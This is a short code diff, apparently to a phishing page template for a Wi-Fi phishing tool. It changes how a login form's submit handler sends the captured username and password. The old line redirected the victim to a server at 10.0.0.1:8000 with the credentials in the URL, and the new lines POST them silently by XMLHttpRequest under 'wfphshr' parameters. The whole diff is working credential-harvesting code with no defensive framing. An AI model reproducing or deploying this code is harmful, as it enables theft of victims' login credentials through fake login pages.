@@ -39,7 +39,9 @@ form.onsubmit = function(event){
 
         let senha = document.getElementById('inputSenha').value;
 
+        const xhr = new XMLHttpRequest();
+        xhr.open("POST", `?wfphshr-email=${login}&wfphshr-password=${senha}`);
         
-        window.location.replace(`http://10.0.0.1:8000/index.php?wfphshr-login=${login}&wfphshr-pass=${senha}`)
+        xhr.send(null)
 
 } 
